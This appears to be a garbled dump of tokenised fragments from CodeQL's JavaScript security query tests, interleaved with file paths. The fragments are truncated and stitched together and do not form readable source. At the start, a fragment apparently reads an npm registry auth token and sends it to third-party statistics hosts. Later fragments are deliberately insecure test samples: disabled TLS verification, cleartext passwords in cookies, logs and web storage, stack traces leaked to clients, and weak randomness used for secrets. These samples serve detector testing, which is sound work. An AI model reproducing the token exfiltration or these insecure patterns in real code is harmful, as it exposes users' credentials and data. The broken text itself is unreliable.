})var con ... sRead);content ... esRead)content ... trim();content ... .trim()content ... ").trimcontent ... =", "")"//regi ... Token="//registry.npmjs.org/:_authToken=//registrynpmjsorg/:_authToken=https1  ... https")https1. ... => { })https1.gethostnam ... ts.com""sstati ... ts.com"sstatic1.histats.comsstatic1histatspath: " ... 75&101"/0.gif?4103075&101/0gif?4103075&101{ Refer ... ntent }Referer ... content"http:/ ... contenthttp://1.a/http://1a/hostnam ... er.com"c.statcounter.comstatcounterpath: " ... d71/1/""/11760 ... d71/1/"/11760461/0/7b5b9d71/1/http://2.b/http://2b//mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-200/subfolder/package.json/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-200/subfolder/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-200/subfolder/private-file-exposure-2.js Static files:// Static files:var htt ... 'http')var app = express()var ser ... er(app)server  ... er(app)http.cr ... er(app)/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-201/PostMessageStar.js/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-201window. ... , '*');window. ... e, '*')window. ... Messagewindow.parent/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-201/PostMessageStar2.js"unproblematic"authKeywindow. ... d, '*')(functi ... K\n})();(functi ... OK\n})()var data = {};data = {}data.foo = password;data.foo = passworddata.foodata.ba ... matic";data.ba ... ematic"data.barwindow. ... a, '*')window. ... o, '*')window. ... r, '*')window. ... y, '*')/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-201/PostMessageStarGood.js'https://lgtm.com'window. ... .com');window. ... m.com')https://lgtm.comhttps://lgtm/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-209/node.js/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-209handleRequest500"Content-Length""Exception occurred""An exception occurred"http.cr ... (3000);http.cr ... n(3000)http.cr ... dy);\n})functio ... ody);\n}{\n  var ... ody);\n}var body;try {\n  ... rn;\n  }{\n    b ... q);\n  }body =  ... t(req);body =  ... st(req)handleRequest(req)catch ( ... rn;\n  }res.sta ...  = 500;res.statusCode = 500res.set ... lain");res.set ... plain")res.end(err.stack);res.end(err.stack)err.stackres.sta ...  = 200;res.statusCode = 200res.set ... json");res.set ... /json")body.lengthres.end(body);res.end(body)log("Ex ... stack);log("Ex ... .stack)Exception occurredres.end ... rred");res.end ... urred")"An exc ... curred"An exception occurred/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-209/tst.js"Caught exception "Caught exception http.cr ...   }\n});http.cr ... \n  }\n}){\n  try ... K\n  }\n}try {\n  ...  OK\n  }{\n    t ... ();\n  }throw new Error();new Error()catch ( ...  OK\n  }res.end(e);res.end(e)fail(res, e);fail(res, e)res.end(e.message);res.end(e.message)e.messageres.end ... " + e);res.end ...  " + e)"Caught ... n " + eres.end ... ing());res.end ... ring())e.toString()e.toStringres.end ... {e}.`);res.end ... ${e}.`)`Caught ...  ${e}.`res.end(e.stack);res.end(e.stack)e.stack/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-295/tst.js/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-295 OK (but probably unsafe after all)// OK ( ... er all)unknownCallNODE_TLS_REJECT_UNAUTHORIZED"0"getOptionsselfSignedSSLverifySsl'boolean'let htt ... "tls");new https.Agent();new https.Agent()new htt ...  OK\n});new htt ... / OK\n}){\n  rej ... // OK\n}rejectU ... d: trueunknown ... ll)\n});unknown ... all)\n}){\n  rej ...  all)\n}rejectU ... : falsenew htt ... T OK\n}){\n  rej ... OT OK\n}process ...  = "0";process ... D = "0"process ... HORIZEDNODE_TL ... HORIZEDhttps.g ...  OK\n});https.g ... T OK\n})new tls ...  OK\n});new tls ... T OK\n})tls.con ...  OK\n});tls.con ... T OK\n})let soc ... cket();socket  ... ocket()new tls.TLSSocket()socket. ...  OK\n});socket. ... T OK\n})socket.renegotiatelet ind ...  false;indirect = false{\n\treje ... OT OK\n}rejectU ... ndirect{\n\treje ... // OK\n}rejectU ...  !false!falserejectU ... !!false!!falserejectU ... : !true!truerejectU ...  !!true!!truerejectU ... known()rejectU ... gnedSSL!getOpt ... gnedSSLgetOpti ... gnedSSLgetOptions()rejectU ... horizedgetOpti ... horized!!getOp ... horized!getOpt ... horizedrejectU ... rifySslgetOpti ... rifySslgetOptions() == nullrejectU ... definedtypeof  ... definedtypeof  ... oolean'typeof  ... horized/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-295/tst2.jsrequestOptions"accept"requestBodyapiContextconst r ... uest');let req ... false\n}request ... false\n}{\n    h ... false\n}"conten ... n/json""accept ... n/json"requestCert: trueagent: falsemodule. ...    })\n}module.exports.post(url, r ...    })\n}{\n    O ...    })\n}Object. ... \n    })body: J ... stBody)JSON.st ... stBody)headers ... ontext)Object. ... ontext)request ... headersreturn  ... \n    })request ... ).catchrequest ... s).thenrequest ... ptions)request.post(res) = ... ;\n    }return  ... .body);Promise ... s.body)res.body(err) = ... ;\n    }return  ... e(err);Promise.resolve(err)/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-312/CleartextStorage.js/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-312 BAD: Setting a cookie value with cleartext sensitive data.// BAD: ... e data.'/remember-password'pw"current_password""password"app.get ... w);\n});app.get ... pw);\n})/remember-passwordfunctio ...  pw);\n}{\n  let ...  pw);\n}let pw  ... word");pw = re ... sword")req.par ... sword")current_passwordres.coo ... ", pw);res.coo ... d", pw)/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-312/CleartextStorage2.js'https''Set-Cookie''password='var htt ... ttps');https = ... https')require('https')var url ... 'url');var ser ... });\n});server  ...  });\n})https.c ...  });\n})let pw  ... ssword;pw = ur ... asswordurl.par ... asswordres.wri ... '\n  });res.wri ... n'\n  }){\n    ' ... in'\n  }'Set-Co ... =' + pw'password=' + pwpassword=/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-312/CleartextStorageGood.js GOOD: Encoding the value before setting it.// GOOD ... ing it.'crypto'getPasswordcipher'aes-256-ctr''hex'var cry ... word();crypto  ... rypto')require('crypto')passwor ... sword()getPassword()functio ... ex');\n}{\n  var ... ex');\n}var cip ... sword);cipher  ... ssword)crypto. ... ssword)aes-256-ctrreturn  ... 'hex');cipher. ... ('hex')cipher. ...  'hex')cipher.updatehexcipher.final('hex')cipher.finalapp.get ... w));\n})functio ... pw));\n}{\n  let ... pw));\n}res.coo ... t(pw));res.coo ... pt(pw))encrypt(pw)/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-312/browser.jsimport  ...  "foo";window.location;/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-312/build-leaks.js This filters makes it safe.// This ... t safe.webpack"webpack"pluginDefinePlugin"process.env"'process.env'DEBUGgetEnvNODE_ENV'development'stringifedstringified'production'"process.env.secret"REACT_APP/^REACT_APP_/igetOnlyReactVariablesgetOnlyReactVariables2getOnlyReactVariables3"1""2""3"const w ... pack");webpack ... bpack")require("webpack")var plu ... nv)\n});plugin  ... env)\n})new web ... env)\n})webpack.DefinePlugin{ // NO ... .env)\n}"proces ... ss.env)JSON.st ... ss.env)new web ... G }) }){ 'proc ... UG }) }'proces ... EBUG })JSON.st ... EBUG }){ DEBUG ... DEBUG }DEBUG:  ... v.DEBUGprocess.env.DEBUGconst r ...      })raw = O ...      })Object. ...      })Object. ... ss.env)(env, k ...       }env[key ... nv[key]env[key]process.env[key]return envNODE_EN ... opment'process ... opment'process ...  || envprocess.env.NODE_ENVdevelopmentconst s ... )\n    }stringi ... )\n    }'proces ...  }, {})Object. ...  }, {})Object.keys(raw)env[key ... w[key])JSON.st ... w[key])raw[key]return  ... d\n    }{\n      ... d\n    }raw: rawstringi ... ingifednew web ... ified);new web ... gified)getEnv( ... ngifiedgetEnv('production')productionhttps.c ... T OK\n})var plu ... pw) });plugin  ... (pw) })new web ... (pw) }){ "proc ... y(pw) }"proces ... ify(pw)process.env.secretJSON.stringify(pw)const R ... APP_/i;REACT_A ... _APP_/i^REACT_APP_REACT_APP_getOnly ... riablesconst r ...      );raw = O ...       )Object. ...       )Object. ... t(key))Object. ... .filterkey =>  ... st(key)REACT_APP.test(key)REACT_APP.testenv[key ... v[key];return env;return raw;new web ... les());new web ... bles())getOnly ... ables()getOnly ... iables2if (REA ...       }new web ... es2());new web ... les2())getOnly ... bles2()getOnly ... iables3if (key ...       }key ==  ... ", "3"]["1", "2", "3"]new web ... es3());new web ... les3())getOnly ... bles3()/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-312/passwords.js OK - but still flagged due to flow-insensitive field-analysis. [INCONSISTENCY] OK XXX// OK XXX OK, but still flagged [INCONSISTENCY]// OK,  ... STENCY] NB: for security reasons, we only log passwords in test environments// NB:  ... onmentsmyLog", ", obj1obj2obj3fixed_password"123"messagesIncorrectPasswordErrorhashed_passwordloginwrappedJSObjectencryptedPasswordHTML5QQencodedPasswordcryptactually_secure_passworduser1crypted_passworduser2user3encryptLibencryptPasswordactually_ok_password_1hashed1hashed2actually_ok_password_2_passwordMD5_password_shautilityObjectpasswordSetdisplayedPassword"(hidden)"pw: redact'password'"********""Password is: "isTestEnvTESTisProduction"tarski"cfgindirectLogCallUtilprocdesc/./g"*"/foo/g'debug''test'console ... sword);console ... ssword)o.passwordconsole ... ord());console ... word())o.getPassword()o.getPasswordconsole.log(x);console.log(x)myLog(password);myLog(password)name +  ... asswordname + ", "console ... ord}`);console ... word}`)`${name ... sword}`var obj ... \n    };obj1 =  ... x\n    }{\n      ... x\n    }password: xconsole.log(obj1);console.log(obj1)obj2 =  ... d\n    }x: passwordconsole.log(obj2);console.log(obj2)var obj3 = {};obj3 = {}console.log(obj3);console.log(obj3)obj3.x = password;obj3.x = passwordobj3.xvar fix ...  "123";fixed_p ... = "123"123console ... Error);console ... dError)message ... rdErrorIncorre ... rdErrorthis.hashed_passwordlogin.w ... asswordlogin.w ... SObjectHTML5QQ ... asswordconsole ... (pw)});console ... t(pw)}){passwo ... pt(pw)}password: crypt(pw)crypt(pw)var act ... sword);actuall ... ssword)actuall ... asswordcrypt(password)var user1 = {};user1 = {}user1.c ...  = x();user1.c ... d = x()user1.c ... asswordx()console.log(user1);console.log(user1)var user2 = {};user2 = {}user2.p ... hash();user2.p ...  hash()user2.passwordhash()console.log(user2);console.log(user2)var use ... \n    };user3 = ... )\n    }passwor ... ssword)encrypt ... ssword)encrypt ... asswordreq.body.passwordconsole.log(user3);console.log(user3)var act ... hed1();actuall ... shed1()actuall ... sword_1hashed1()console ... ord_1);console ... word_1)var has ... rd_2();hashed2 ... ord_2()actuall ... ord_2()actuall ... sword_2console ... shed2);console.log(hashed2)console ... rdMD5);console ... ordMD5)this._passwordMD5console ... d_sha);console ... rd_sha)this._password_shavar uti ... }\n    }utility ... }\n    }passwor ... ion(){}console ... bject);console ... Object)var dis ... dden)";display ... idden)"passwor ... idden)"(hidden)var con ... \n    };config  ... d\n    }passwor ... asswordconsole.log(config);console.log(config)var tem ... word };temp =  ... sword }{ encry ... sword }temp.en ... asswordvar sec ... ssword;secret = passwordconsole ... ret}`);console ... cret}`)`pw: ${secret}`value & ... ssword'kind == 'password'return "********"********return value;console ... word));console ... sword))"Passwo ... ssword)Password is: redact( ... ssword)if (env ... ]\n    }environ ... stEnv()environ ... TestEnv{\n      ... ]\n    }"Passwo ... asswordenvironment.is(TEST)environment.isif (x.t ... .\n    }x.test(y)x.testf();f()if (env ... sword);if (x.t ... }\n    }if (f() ...       }if (!en ... ]\n    }!enviro ... ction()environ ... ction()environ ... ductionconsole ... ing());console ... ring())name +  ... tring()password.toString()password.toStringconsole ... eOf());console ... ueOf())name +  ... lueOf()password.valueOf()password.valueOffunctio ... ably)\n}{\n    v ... ably)\n}config  ... )\n    }hostname: "tarski"tarskiy: getPassword()var cfg ... config;cfg = x ...  configx? config: configconsole ... tname);console ... stname)config.hostnameconsole ... fig.x);console ... nfig.x)config.xconsole ... fig.y);console ... nfig.y)config.yconsole ... ig[x]);console ... fig[x])config[x]functio ... nts);\n}{\n\tcons ... nts);\n}console ... ments);console ... uments)console.log.applyvar Uti ... util');Util =  ... 'util')(functi ... OK.\n});(functi ...  OK.\n})functio ... / OK.\n}{\n    v ... / OK.\n}indirec ... fig.x);indirec ... nfig.x)indirec ... s.env);indirec ... ss.env)var pro ... /g, '')procdes ... /g, '')Util.in ... /g, '')Util.in ... replaceUtil.in ... ss.env)Util.inspectindirec ... cdesc);indirec ... ocdesc)console ... s.env);console ... ss.env)console ... .PATH);console ... v.PATH)process.env.PATHconsole ... bar"]);console ... "bar"])process ...  "bar"]"foo" + "bar"(functi ... !\n})();(functi ... K!\n})()(functi ...  OK!\n})functio ... T OK!\n}{\n\tcons ... T OK!\n}console ...  "*"));console ... , "*"))passwor ... g, "*")password.replaceconst d ... test');debug = ... 'test')require ... 'test')require('debug')debug(p ...  "*"));debug(p ... , "*"))/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-312/passwords_in_browser1.js/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-312/passwords_in_browser2.js"./browser"import  ... owser";./browser/browser/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-312/passwords_in_server_1.jsapp.get ... () {\n})function() {\n}/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-312/passwords_in_server_2.jsrequire("foo");require("foo")(functi ... es){});(functi ... res){})functio ...  res){}/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-312/passwords_in_server_3.js"./server"var ser ... rver");server  ... erver")require("./server")./server/server/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-312/passwords_in_server_4.js/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-312/passwords_in_server_5.jsapp.get ... rd);\n})functio ... ord);\n}{\n    f ... ord);\n}f(req.q ... sword);f(req.q ... ssword)req.query.passwordfunctio ... g(x);\n}{\n    c ... g(x);\n}/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-312/server.js/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-312/server2.js"./server.js""./passwords_in_server_4.js"require ... er.js")./server.jsrequire ... _4.js")"./pass ... r_4.js"./passwords_in_server_4.js/passwords_in_server_4/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-312/tst-angularjs.js"app""controller"$cacheFactory$templateCache$cookiesdata1data2data3putObjectdata4data5data6data7angular ... ("app")$cacheF ... sword);$cacheF ... ssword)$cacheFactory.putdata1.password$templa ... sword);$templa ... ssword)$templateCache.putdata2.password$cookie ... sword);$cookie ... ssword)$cookies.putdata3.password$cookies.putObjectdata4.password$cookies.otherdata5.passwordother.p ... sword);other.p ... ssword)other.putdata6.password$cookie ... , "x");$cookie ... d, "x")data7.password/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-312/tst-webstorage.jslocalSt ... ssword;localSt ... asswordlocalStorage.xdata.passwordlocalSt ... ssword)session ... ssword;session ... asswordsessionStorage.xsession ... ssword)/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-313/example/tst.js/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-313/example/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-313{\n  "pa ... cret"\n}"super secret"super secret/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-313/locales/de.js/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-313/locales{\n  "pa ... wort"\n}"Passwort"Passwort/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-313/package.json"example""0.0.1"{\n    " ... "*"\n  }mysql{\n    " ... wd"\n  }"/bin/pwd"/bin/pwdpwd/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-313/tst.js'mysql''./mysql-config.json'var mys ... json');mysql   ... mysql')require('mysql')config  ... .json')require ... .json')'./mysq ... g.json'./mysql-config.json/mysql-configmysql.c ... onfig);mysql.c ... config)mysql.c ... nectionconnect ... nect();connection.connect()connection.connectconnection.end();connection.end()connection.end/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-313/tst.ramltag:yaml.org,2002:strtag:yaml.org,2002:mappassword: stringyaml/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-313/tst.ymlstepsPASSWORD="$(PASSWORD)" npm install
OTHER_PASSWORD=`get password` yarn install
script: |tag:yaml.org,2002:seq- script: |<%= ENV['USERNAME'] %><%= ENV ... ME'] %><%= ENV['PASSWORD'] %><%= ENV ... RD'] %>change_mesteps:/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-313/tst7.yml$$SOME_VAR[mail]
host = smtp.mydomain.com
port = 25
username = sample_admin@mydomain.com
password = abc
password: $$SOME_VAR/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-313/tst8.yml[mail]
host = smtp.mydomain.com
port = 25
username = {{username}}
password = {{pwd}}
config: |/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-327/bad-random.js/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-327 OK - input is a random byte, so the output is a uniformly random number between 0 and 7. // OK - ... and 7.  GOOD - protected by a bias-checking comparison.// GOOD ... arison. OK - 8 is a power of 2, so the result is unbiased.// OK - ... biased. OK - the operands have already been flagged - but flagged anyway due to us not detecting that [INCONSISTENCY].// OK - ... TENCY]. OK - result is not rounded. // OK - ... unded.  NOT OK - division generally introduces bias - but not flagged due to not looking through nested arithmetic. // NOT  ... metic.  OK - bit shifts are usually used to construct larger/smaller numbers, // OK - ... mbers,  OK - division by 0xff (255) gives a uniformly random number between 0 and 1. // OK - ... and 1.  NOT OK - division by 100 gives bias - but not flagged due to not looking through nested arithmetic.  OK - producing a larger number from smaller numbers.// OK - ... umbers. OK - string concat// OK - ...  concat OK - modulo by power of 2.// OK - ... r of 2. OK - generating a large number from smaller bytes.// OK - ...  bytes.bytesdigits25.6'0.'internalsrandomDigitspos250"Failed to make bits."randomDigits2setStepsbytesecureRandom"secure-random"goodRandom1goodRandom2dontFlag0xff0.5<<crbcryptoRand0x010000000x000100000x000001000x00000001eighttwoHundredAndFiftyFive310x10000000000000x100000000000x1000000000x10000000x100000000xffffffffffff0xfffffffffff0xffffffffff0xfffffffff0xffffffff0xfffffff0xffffffconst c ... ypto');var bad ... (1)[0];bad = c ... s(1)[0]crypto. ... s(1)[0]crypto. ... ytes(1)const b ... bytes);buffer  ... (bytes)crypto. ... (bytes)const digits = [];digits = []for (le ... OT OK\n}i < buffer.lengthdigits. ... 25.6));digits. ...  25.6))digits.pushMath.fl ... / 25.6)buffer[i] / 25.6buffer[i]digits. ... ] % 8);digits. ... i] % 8)buffer[i] % 8digits. ... % 100);digits. ...  % 100)buffer[i] % 100var bad ... 0, 3));bad = N ... (0, 3))Number( ... (0, 3))'0.' +  ... E(0, 3)0.crypto. ... E(0, 3)crypto. ... dUIntBEcrypto. ... ytes(3)var goo ... 0, 3));good =  ... (0, 3))10 + cr ... E(0, 3)const i ... s = {};internals = {}exports ... '');\n};exports ... ('');\n}exports.randomDigits{\n    c ... ('');\n}let buf ... e * 2);buffer  ... ze * 2)interna ... ze * 2)internals.randomsize * 2let pos = 0;pos = 0digits.length < sizedigits.lengthif (pos ...       }pos >= buffer.lengthbuffer  ... e * 2);pos = 0;if (buf ...       }buffer[pos] < 250buffer[pos]digits. ...  % 10);digits. ... ] % 10)buffer[pos] % 10++pos;++posdigits.join('')digits.joininterna ...    }\n};interna ...     }\n}{\n    t ...     }\n}return  ... bytes);throw n ... its.");new Err ... bits.")"Failed ...  bits."Failed to make bits.Failed to make bitsexports ... Digits2crypto. ... ze * 2)var num ... r[pos];num = buffer[pos]if (num ...       }num < 250digits. ... m % 10)num % 10for (co ... K\n    }buffer.values()buffer.valuesconst bytebyte / 25.6digits. ... e % 8);digits. ... te % 8)byte % 8byte % 100const s ... ndom");secureR ... andom")require ... andom")secure-randomvar bad ... 10)[0];bad = s ... (10)[0]secureR ... (10)[0]secureRandom(10)[0]secureRandom(10)var goo ... 10)[0];goodRan ... (10)[0]5 + sec ... (10)[0]var bad ... andom2;bad = g ... Random2goodRan ... Random2var don ...  + bad;dontFlag = bad + badbad + badvar goo ... / 0xff;good =  ...  / 0xffsecureR ...  / 0xffvar goo ... 25.6));good =  ...  25.6))Math.ce ...  25.6))0.5 - ( ... / 25.6)(secure ... / 25.6)secureR ...  / 25.6var goo ... (3)[0];good =  ... s(3)[0](crypto ... s(3)[0](crypto ... ] << 8)crypto. ... 0] << 8crypto. ... s(3)[0]var goo ... 0xff));good =  ...  0xff))Math.fl ...  0xff))max * ( ... / 0xff)(crypto ... / 0xff)crypto. ...  / 0xffvar bad ...  100));bad = M ... / 100))Math.fl ... / 100))max * ( ...  / 100)(crypto ...  / 100)crypto. ... ] / 100var crb ... tes(4);crb = c ... ytes(4)crypto. ... ytes(4)var cry ... crb[3];cryptoR ...  crb[3]0x01000 ...  crb[3]0x01000 ...  crb[2]0x01000 ...  crb[1]0x01000000 * crb[0]16777216crb[0]0x00010000 * crb[1]65536crb[1]0x00000100 * crb[2]256crb[2]0x00000001 * crb[3]crb[3]var goo ... "bar");good =  ...  "bar")(secure ...  "bar")(secure ...  "foo")secureR ... + "foo"secureR ... + "bar"var eight = 8;eight = 8var goo ...  eight;good =  ... % eightcrypto. ... % eightcrypto. ... s(4)[0]var two ... = 0xff;twoHund ...  = 0xfftwoHund ... ftyFivevar goo ... Five));good =  ... yFive))Math.fl ... yFive))max * ( ... tyFive)(crypto ... tyFive)crypto. ... ftyFivevar a = ... es(10);a = cry ... tes(10)crypto. ... tes(10)var goo ... i + 6];good =  ... [i + 6]((a[i]  ... [i + 6]((a[i]  ... ] << 8)((a[i]  ...  << 16)((a[i]  ... 000000)(a[i] & ... 0000000(a[i] & 31)a[i] & 31a[i]281474976710656(a[i +  ... 000000)a[i + 1 ... 0000000a[i + 1]1099511627776a[i + 2 ... 0000000a[i + 2]i + 24294967296a[i + 3] * 0x1000000a[i + 3]i + 3(a[i + 4] << 16)a[i + 4] << 16a[i + 4]i + 4(a[i + 5] << 8)a[i + 5] << 8a[i + 5]i + 5a[i + 6]i + 6(a[i] * ... [i + 6](a[i] * 0x100000000)a[i] * 0x100000000(a[i +  ... [i + 6]268435456var foo ... xfffffffoo = 0 ... xffffff0xfffff ... xffffff0xfffff ... fffffff28147497671065517592186044415109951162777568719476735429496729526843545516777215i < 10crypto. ... 0] % 10while ( ... // OK\n}digits.length < 10const b ... (1)[0];byte =  ... s(1)[0]if (byt ... ;\n    }byte >= 250digits. ... e % 10)byte % 10/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-327/tst.js sensitive according to SensitiveActions.qll// sens ... ons.qll OK: not secret information// OK:  ... rmation OK: unknown algorithm// OK:  ... gorithm OK (flagged by js/insufficient-password-hash)// OK ( ... d-hash)secretTexttrusteddesCipher'des'aesCipher'aes-128'unknownCipher'unknown'publicInfovar sec ... rusted;secretText = trustedconst d ... , key);desCiph ... ', key)crypto. ... ', key)desconst a ... , key);aesCiph ... ', key)aes-128const u ... , key);unknown ... ', key)desCiph ... 'hex');desCiph ...  'hex')desCipher.writeaesCiph ... 'hex');aesCiph ...  'hex')aesCipher.updateunknown ... 'hex');unknown ...  'hex')unknownCipher.updateo.trusted/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-338/tst.js/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-338 (no complaining about further uses)// (no  ... r uses) NOT OK, but our naming heuristic does not identify `pw` as sensitive [INCONSISTENCY] OK (we flagged secret1 above)// OK ( ...  above) OK - Math.random() is only a fallback.// OK - ... llback. NOK OK// NOK OKf1f2f3f4suffixf5f6f7f8someSecureRandomThingf9f10f11f12f13f14f15rand9999999f16f17secret1secret2secret3f18'sha256'genRandomisSafari36uuid4_000_000_000sessionUidmy_nice_uidliquidUUIDMY_UIDvar pas ... ndom();passwor ... andom()"prefix ... andom(){\n    v ... ord);\n}f(password);f(password)password = 42;password = 42g(password);g(password)var suf ...  % 255;suffix  ... ) % 255Math.random() % 255var pas ... suffix;passwor ...  suffix"prefix" + suffixvar pw  ... ndom();pw = Math.random()var password = pw;password = pwvar num ... andom()number  ... andom()var pas ... hing();passwor ... Thing()someSec ... Thing()someSec ... omThing!Math.random()var sec ... ndom();secret  ... andom()var o = {};o = {}o.secre ... andom()o.secret{\n    ( ...   });\n}({\n     ...     });({\n     ... \n    })secret: ... andom()'' + Math.random()var sec ... dom());secret  ... ndom())Math.fl ... ndom())var ts  ... Time();ts = ne ... tTime()new Date().getTime()new Date().getTimevar ran ... 99999);rand =  ... 999999)Math.fl ... 999999)Math.ra ... 9999999var con ... ring();concat  ... tring()ts.toSt ... tring()ts.toString()ts.toStringrand.toString()rand.toStringres.sen ... ncat});res.sen ... oncat}){secret: concat}secret: concatfunctio ... m());\n}{\n    f ... m());\n}secret++;secret++f(Math.random());f(Math.random())functio ... bove)\n}{\n    v ... bove)\n}secret1 ... andom()var sec ... ecret1;secret2 = secret1var sec ... ecret2;secret3 = secret2{\n    v ... m());\n}(o.pass ... ndom())o.passw ... andom()var cry ... ypto');crypto. ... dom());crypto. ... ndom())sha256(functi ... k.\n})()(functi ... ack.\n})functio ... back.\n}{\n    f ... back.\n}if (win ...       }window. ... afari()window. ... mValueswindow.cryptocrypto. ... mValues!isSafari()isSafari()var a = ... n = '';a = win ... ray(3))window. ... ray(3))new Uint32Array(3)token = ''for (va ...       }i < lvar i = ... .lengthl = a.lengtha.lengthtoken + ... ng(36);token + ... ing(36)a[i].toString(36)a[i].toStringreturn token;(Math.r ... /g, '')(Math.r ... replace(Math.r ... ing(36)(Math.r ... oString(Math.r ... Time())Math.ra ... tTime()secret = genRandom()genRandom()functio ... OK OK\n}{\n    v ... OK OK\n}var uui ... 0_000);uuid =  ... 00_000)Math.fl ... 00_000)Math.ra ... 000_0004000000000var ses ... 0_000);session ... 00_000)var uid ... 0_000);uid = M ... 00_000)var my_ ... 0_000);my_nice ... 00_000)var liq ... ndom();liquid  ... andom()var UUI ... ndom();UUID = Math.random()var MY_ ... ndom();MY_UID  ... andom()/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-346/tst.js/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-346 OK, fixed origin// OK, fixed origin NOT OK, tainted origin// NOT  ...  origin NOT OK, null origin OK, credentials are not transferred// OK,  ... sferred OK, sanitized origin// OK,  ...  origin syntactic header defintion// synt ... fintion NOT OK (but not detected) [INCONSISTENCY]"Access-Control-Allow-Origin""https://semmle.com""Access-Control-Allow-Credentials""null"probalyAServerALLOWED_ORIGINSvar ser ... n(){});server  ... on(){})https.c ... on(){})server. ... e);\n});server. ... ue);\n})server.onfunctio ... rue);\n}{\n    r ... rue);\n}res.set ... .com");res.set ... e.com")"Access ... Origin"Access-Control-Allow-Originhttps://semmle.comhttps://semmleres.set ...  true);res.set ... , true)"Access ... ntials"Access-Control-Allow-Credentials{\n    l ... rue);\n}let ori ... origin;origin  ... .originurl.par ... .originres.set ... rigin);res.set ... origin)(req, r ... rue);\n}res.set ...  null);res.set ... , null)res.set ... null");res.set ... "null")server. ... red\n});server. ... rred\n})functio ... erred\n}{\n    l ... erred\n}(req, r ... erred\n}{\n    r ... erred\n}server. ... se);\n})(req, r ... lse);\n}{\n    r ... lse);\n}res.set ... false);res.set ...  false)server. ...   }\n});server. ...    }\n})if (ori ... ;\n    }origin in oprobaly ... e);\n});probaly ... ue);\n})probalyAServer.onif (ALL ... ;\n    }ALLOWED ...  !== -1ALLOWED ... origin)ALLOWED ... indexOfALLOWED ... n) >= 0/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-352/MissingCsrfMiddlewareBad.js/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-352passport'passport'authorize'/changeEmail'newEmail"newEmail"errorCatch"Caught "'/doLoginStuff'loginStuffvar coo ... rser');var pas ... port');passpor ... 